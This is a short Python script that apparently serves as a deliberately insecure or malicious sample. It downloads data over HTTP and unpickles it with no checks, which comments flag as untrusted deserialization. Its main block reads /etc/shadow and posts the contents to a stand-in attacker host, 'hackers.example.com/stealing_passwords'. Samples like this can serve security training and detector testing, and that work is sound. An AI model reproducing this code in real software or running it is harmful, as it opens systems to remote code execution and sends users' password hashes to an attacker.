import pickle

import requests


def load_pickle_from_http(url):
    response = requests.get(url)

    # Insecurely load the pickle data directly from the HTTP response
    pickle_data = pickle.loads(response.content)  # Untrusted deserialization

    return pickle_data


if __name__ == "__main__":
    url = "http://example.com/pickle_data"  # Example URL to fetch a pickle object
    data = load_pickle_from_http(url)
    print(data)
    try:
        with open("/etc/shadow", "r") as shadow_file:
            shadow_contents = shadow_file.read()

        # Upload the contents to the fictional malicious URL
        response = requests.post(
            "http://hackers.example.com/stealing_passwords",
            data={"shadow_file": shadow_contents},
        )

    except Exception as e:
        print(f"An error occurred: {e}")
